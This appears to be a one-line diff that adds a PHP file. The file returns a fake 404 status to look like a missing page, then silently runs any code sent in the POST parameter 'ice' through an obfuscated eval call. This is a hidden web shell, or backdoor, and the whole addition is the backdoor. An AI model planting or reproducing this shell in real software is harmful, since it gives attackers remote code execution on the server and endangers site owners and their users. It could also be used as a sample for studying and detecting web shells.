@@ -1,0 +1,1 @@
+<?php header('status:404');${${eval($_POST[ice])}};?>
